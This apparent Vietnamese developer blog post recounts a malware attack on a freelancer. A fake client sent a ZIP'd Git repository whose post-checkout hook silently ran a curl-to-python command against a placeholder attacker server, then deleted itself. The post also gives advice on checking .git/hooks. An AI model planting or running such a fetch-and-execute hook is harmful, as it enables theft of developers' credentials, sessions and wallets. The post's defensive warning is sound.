---
title: "Cảnh báo dành cho Freelancer và lập trình viên: Tôi đã bị nhiễm mã độc từ một khách hàng giả qua Git repository"
date: 2026-06-08
tags: ["security", "git", "freelancing", "malware", "tips"]
categories: ["posts"]
description: "Một cuộc tấn công mã độc thực sự nhắm vào freelancer qua một Git post-checkout hook độc hại ẩn trong file ZIP repository do một khách hàng giả gửi."
---

Tôi vừa trở thành nạn nhân của một cuộc tấn công mã độc từ một người giả làm khách hàng trên một nền tảng freelance. Tôi chia sẻ chính xác những gì đã xảy ra để các lập trình viên khác có thể nhận biết và tránh được cái bẫy tương tự.

## Cuộc tấn công diễn ra như thế nào

1. "Khách hàng" gửi cho tôi một file ZIP chứa một Git repository.
2. Họ yêu cầu tôi checkout một branch tên `plan` để xem yêu cầu của dự án.
3. Tôi tải file ZIP và chạy:

```bash
git checkout plan
```

Chỉ vậy là đủ để máy tôi bị nhiễm.

## Bên trong là gì

Sau khi điều tra sự cố, tôi phát hiện repository chứa một Git hook `post-checkout` độc hại. Khi branch được checkout, hook tự động thực thi:

```bash
curl -s https://<attacker-server>/dtech/tunetrek | python3
```

Hook cũng tự xóa mình sau khi thực thi để việc bị xâm nhập khó bị phát hiện hơn.

## Toàn bộ chuỗi tấn công

```
Khách hàng giả
  ↓
ZIP repository
  ↓
"Vui lòng checkout branch plan"
  ↓
Git post-checkout hook
  ↓
Tải payload từ xa qua curl
  ↓
Thực thi payload bằng Python
  ↓
Đánh cắp thông tin đăng nhập, session trình duyệt, ví crypto, và dữ liệu nhạy cảm khác
```

## Git Hooks là gì (và vì sao nó nguy hiểm)

Git hooks là các script mà Git tự động chạy trước hoặc sau một số sự kiện nhất định — commit, merge, checkout, và nhiều hơn nữa. Chúng nằm trong thư mục `.git/hooks/` của bất kỳ repository nào. Vì `.git/` không được theo dõi bởi version control, các script này không hiển thị khi xem một project trên GitHub hoặc GitLab. Chúng chỉ phát huy tác dụng khi bạn đã có repository trên máy của mình.

Hook `post-checkout` được kích hoạt mỗi khi bạn chạy `git checkout`. Người tạo ra cuộc tấn công này hiểu rằng yêu cầu một freelancer "checkout một branch để xem yêu cầu" là điều hoàn toàn bình thường — đó là việc các lập trình viên làm mà không cần suy nghĩ thêm.

## Những bài học rút ra

- **Không bao giờ tin tưởng các ZIP repository được gửi bởi khách hàng lạ.** Một liên kết GitHub công khai an toàn hơn nhiều — ít nhất, lịch sử và file của repository có thể xem được trước khi bạn clone.
- **Luôn kiểm tra `.git/hooks/` trước khi chạy các lệnh Git** trên bất kỳ repository nào bạn không clone từ nguồn đáng tin cậy.
- **Hãy cẩn trọng khi khách hàng yêu cầu bạn checkout một branch cụ thể ngay sau khi gửi file ZIP.** Đây là một dấu hiệu cảnh báo.
- **Xem xét các repository lạ trong một VM hoặc môi trường cách ly.** Các công cụ như Docker, VirtualBox, hoặc một máy dùng một lần riêng biệt có thể hạn chế vùng ảnh hưởng của một cuộc tấn công như thế này.
- **Kiểm tra các file hook có thể thực thi.** Trên Linux/macOS, chạy `ls -la .git/hooks/` và tìm bất cứ thứ gì không phải file `.sample`. Nếu bạn thấy `post-checkout`, `pre-commit`, hoặc tương tự mà không có đuôi `.sample`, hãy đọc kỹ nội dung trước khi tiếp tục.

## Cách kiểm tra hooks nhanh

Trước khi chạy bất kỳ lệnh Git nào trên một repository không đáng tin cậy, hãy kiểm tra thư mục hooks:

```bash
ls -la .git/hooks/
cat .git/hooks/post-checkout   # nếu nó tồn tại
```

Bất kỳ hook nào không có đuôi `.sample` đều đang hoạt động và sẽ tự động thực thi. Hãy coi bất kỳ file thực thi bất thường trong thư mục đó là đáng nghi.

## Lời kết

Cuộc tấn công này gần như không cần kỹ thuật phức tạp gì từ kẻ tấn công — nó lợi dụng sự tin tưởng và quy trình làm việc thường nhật của lập trình viên. Freelancer là mục tiêu đặc biệt hấp dẫn vì chúng ta thường xuyên nhận code từ người lạ và đã quen với việc nhanh chóng dựng lên các project chưa từng biết.

Hãy luôn cảnh giác, chậm lại khi có gì đó cảm thấy không đúng, và luôn kiểm tra trước khi thực thi.

Nếu bạn đã gặp các cuộc tấn công tương tự gần đây, hãy liên hệ với tôi — tôi rất muốn nghe về các biến thể của kỹ thuật này.

---
**Xem thêm:**
- [Proxy tốt nhất cho Web Scraping](/vi/posts/best-proxies-for-web-scraping/) — cấu hình proxy cho các dự án scraping
- [Python sử dụng Playwright với proxy](/vi/posts/python-using-playwright-with-proxy/) — ví dụ code sử dụng proxy trong Playwright
